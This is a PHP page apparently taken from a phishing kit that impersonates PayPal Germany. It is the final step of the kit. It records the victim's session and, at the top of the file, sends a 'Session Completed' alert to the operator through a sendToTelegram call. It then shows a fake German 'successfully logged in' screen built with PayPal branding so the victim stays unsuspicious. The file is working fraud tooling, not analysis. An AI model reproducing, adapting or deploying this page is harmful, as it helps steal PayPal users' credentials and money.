<?php
require 'config.php';
if (!isset($_GET['sid'])) { redirect('index.php'); exit; }
$sid = $_GET['sid'];
$session = get_session($sid);
$session['last_activity'] = time();
save_session($sid, $session);

if (!isset($session['success_sent']) || $session['success_sent'] !== true) {
    sendToTelegram("✅ <b>PayPal DE - Session Completed!</b>\nSID: <code>$sid</code>", $sid);
    $session['success_sent'] = true;
    save_session($sid, $session);
}
?>
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayPal</title>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
    body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #001435; }
    
    .login-container { width: 100%; max-width: 520px; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; margin-top: auto; margin-bottom: auto; text-align: center; }
    
    .logo-img { height: 42px; margin-bottom: 50px; }
    
    .check-circle { width: 80px; height: 80px; background-color: #e8f5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 25px; }
    .check-circle svg { width: 40px; height: 40px; stroke: #2e7d32; stroke-width: 3; fill: none; }
    
    h1 { font-size: 24px; font-weight: 700; color: #001435; margin-bottom: 12px; }
    p { font-size: 16px; color: #687173; line-height: 1.5; }
</style>
</head>
<body>
    <div class="login-container">
        <img src="paypal_logo.svg" alt="PayPal" class="logo-img" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg'; this.style.height='42px';">
        
        <div class="check-circle">
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        </div>
        
        <h1>Erfolgreich angemeldet</h1>
        <p>Sie werden in Kürze weitergeleitet.</p>
    </div>
</body>
</html>